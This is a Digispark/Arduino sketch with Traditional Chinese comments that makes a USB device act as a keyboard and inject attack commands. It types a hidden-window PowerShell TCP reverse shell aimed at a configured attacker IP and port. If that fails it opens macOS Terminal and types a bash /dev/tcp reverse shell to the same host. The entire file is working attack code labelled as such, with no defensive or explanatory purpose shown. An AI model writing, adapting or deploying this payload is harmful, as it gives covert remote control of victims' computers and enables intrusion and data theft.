#include "DigiKeyboard.h"

// === 配置 ===
#define ATTACKER_IP "192.168.1.100"
#define ATTACKER_PORT "4444"

// 使用 PROGMEM 將字串儲存在 Flash 記憶體而非 RAM
const char payload1[] PROGMEM = "$c=New-Object System.Net.Sockets.TCPClient('";
const char payload2[] PROGMEM = "',";
const char payload3[] PROGMEM = ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};";
const char payload4[] PROGMEM = "while(($i=$s.Read($b,0,$b.Length))-ne 0){;";
const char payload5[] PROGMEM = "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);";
const char payload6[] PROGMEM = "$sb=(iex $d 2>&1|Out-String);";
const char payload7[] PROGMEM = "$sb2=$sb+'PS '+(pwd).Path+'> ';";
const char payload8[] PROGMEM = "$se=([text.encoding]::ASCII).GetBytes($sb2);";
const char payload9[] PROGMEM = "$s.Write($se,0,$se.Length);$s.Flush()};$c.Close()";

void setup() {
  DigiKeyboard.delay(2000);
}

void printProgmemString(const char* str) {
  char c;
  while ((c = pgm_read_byte(str++))) {
    DigiKeyboard.print(c);
  }
}

void loop() {
  // === Windows Attack ===
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -WindowStyle Hidden");
  DigiKeyboard.delay(1500);

  // 輸出 PowerShell payload (從 PROGMEM)
  printProgmemString(payload1);
  DigiKeyboard.print(ATTACKER_IP);
  printProgmemString(payload2);
  DigiKeyboard.print(ATTACKER_PORT);
  printProgmemString(payload3);
  printProgmemString(payload4);
  printProgmemString(payload5);
  printProgmemString(payload6);
  printProgmemString(payload7);
  printProgmemString(payload8);
  printProgmemString(payload9);

  DigiKeyboard.delay(2000);

  // === macOS Attack (如果 Windows 失敗) ===
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Terminal");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // macOS Reverse Shell (簡化版)
  DigiKeyboard.print("bash -i >& /dev/tcp/");
  DigiKeyboard.print(ATTACKER_IP);
  DigiKeyboard.print("/");
  DigiKeyboard.print(ATTACKER_PORT);
  DigiKeyboard.println(" 0>&1 &");

  for(;;) {}
}
